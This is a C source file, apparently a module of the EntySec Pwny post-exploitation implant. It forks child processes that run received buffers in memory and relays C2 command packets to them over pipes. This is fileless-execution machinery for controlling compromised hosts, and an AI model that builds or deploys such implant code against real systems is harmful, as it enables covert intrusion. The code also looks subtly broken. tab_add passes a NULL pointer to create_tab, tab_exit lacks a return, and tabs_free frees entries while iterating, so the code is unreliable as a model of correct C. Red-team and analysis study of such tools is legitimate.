/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

#include <tab.h>
#include <tlv.h>
#include <log.h>
#include <c2.h>
#include <pawn.h>

#include <uthash/uthash.h>

/*
 * Create a tab from buffer.
 */

static int create_tab(tabs_t *tab, unsigned char *buffer)
{
    int pipes[2];

    if (pipe(pipes) == -1)
        return -1;

    pid_t pid = fork();

    if (pid == -1)
        return -1;
    else if (pid == 0)
    {
        dup2(pipes[0], STDIN_FILENO);
        char *argv[] = {"pwny"};

        #ifdef LINUX

        pawn_exec_fd(buffer, argv, environ);

        #else
        #ifdef MACOS

        pawn_exec_bundle(buffer, argv, environ);
        #endif
        #endif
    } else
    {
        fcntl(pipes[1], F_SETFL, O_NONBLOCK);

        tab->fd = pipes[1];
        tab->pid = pid;
    }

    return 0;
}

/*
 * Look through the tabs, find the pool and pass TLV packet to it.
 */

int tab_lookup(tabs_t **tabs, int pool, tlv_pkt_t *tlv_pkt)
{
    log_debug("* Searching for tab entry (%d)\n", pool);

    tabs_t *tab;
    HASH_FIND_INT(*tabs, &pool, tab);

    if (tab != NULL)
    {
        log_debug("* Found tab entry (%d)\n", pool);
        tlv_channel_send_fd(tab->fd, tlv_pkt);

        return 0;
    }

    return -1;
}

/*
 * Add tab with the specific pool from buffer.
 */

void tab_add(tabs_t **tabs, int pool, unsigned char *buffer)
{
    tabs_t *tab;
    HASH_FIND_INT(*tabs, &pool, tab);

    if (tab == NULL)
    {
        tabs_t *tab_new = calloc(1, sizeof(*tab));

        if (tab_new != NULL)
        {
            tab_new->pool = pool;

            if (create_tab(tab, buffer) < 0)
            {
                free(tab_new);
                return;
            }

            HASH_ADD_INT(*tabs, pool, tab_new);
            log_debug("* Added tab entry (%d)\n", pool);
        }
    }
}

/*
 * Exit tab and close it's descriptor.
 *
 * NOTE: Sends API_CALL_QUIT to the tab's console.
 */

int tab_exit(tabs_t *tab)
{
    tlv_pkt_t *tlv_pkt = tlv_channel_pkt(TLV_NO_CHANNEL);

    tlv_channel_send_fd(tab->fd, tlv_pkt);
    close(tab->fd);

    tlv_pkt_free(tlv_pkt);
}

/*
 * Delete a single tab.
 */

int tab_delete(tabs_t **tabs, int pool)
{
    tabs_t *tab;
    HASH_FIND_INT(*tabs, &pool, tab);

    if (tab != NULL)
    {
        tab_exit(tab);
        HASH_DEL(*tabs, tab);

        log_debug("* Deleted tab entry (%d)\n", pool);
        return 0;
    }

    return -1;
}

/*
 * Free tabs table.
 */

void tabs_free(tabs_t *tabs)
{
    tabs_t *tab;

    for (tab = tabs; tab != NULL; tab = tab->hh.next)
    {
        tab_exit(tab);

        log_debug("* Freed tab entry (%d)\n", tab->pool);
        HASH_DEL(tabs, tab);

        free(tab);
    }

    free(tabs);
}
